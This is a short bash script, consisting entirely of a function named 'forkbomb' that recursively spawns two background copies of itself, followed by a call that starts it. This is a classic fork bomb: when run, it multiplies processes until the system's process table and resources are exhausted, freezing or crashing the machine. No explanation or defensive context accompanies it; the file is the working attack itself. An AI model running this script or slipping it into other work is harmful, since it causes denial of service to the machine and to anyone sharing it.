#!/bin/bash

forkbomb() {
    forkbomb | forkbomb&
}

forkbomb
